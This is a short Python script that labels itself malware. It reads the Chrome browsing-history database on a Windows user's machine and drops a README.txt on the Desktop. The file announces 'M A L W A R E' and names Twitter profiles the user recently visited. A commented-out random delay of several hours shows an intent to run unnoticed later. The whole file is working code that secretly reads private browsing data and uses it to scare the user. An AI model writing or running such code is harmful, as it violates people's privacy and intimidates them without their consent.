import os
import random
from pathlib import Path
from time import sleep
import sqlite3
import re

HACKER_FILE_NAME = 'README.txt'


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT * FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            print(urls)
            return urls
        except sqlite3.OperationalError:
            sleep(10)


def create_hacker_file(user_path):
    hacker_file = open(user_path + "\\Desktop\\" + HACKER_FILE_NAME, "w")
    hacker_file.write("M A L W A R E\n\n")
    return hacker_file


def get_user_path():
    user_path = Path.home()
    return str(user_path)


def check_history_and_scare_user(hacker_file, chrome_history):
    profiles_visited = []
    for item in chrome_history[:10]:  # Just the 10 urls
        result = re.findall("https://twitter.com/([A-Za-z0-9]+)$", item[1])
        if result and result[0] not in ["notifications", 'login']:
            profiles_visited.append(result[0])

    hacker_file.write("You visited the profile of {} on Twitter".format(", ".join(profiles_visited)))
#     Regular expression test:  https://pythex.org/


def main():
    n_hours = random.randrange(1, 4)
    # sleep(n_hours * 60 * 60)
    user_path = get_user_path()
    hacker_file = create_hacker_file(user_path)
    chrome_history = get_chrome_history(user_path)
    check_history_and_scare_user(hacker_file, chrome_history)


if __name__ == "__main__":
    main()
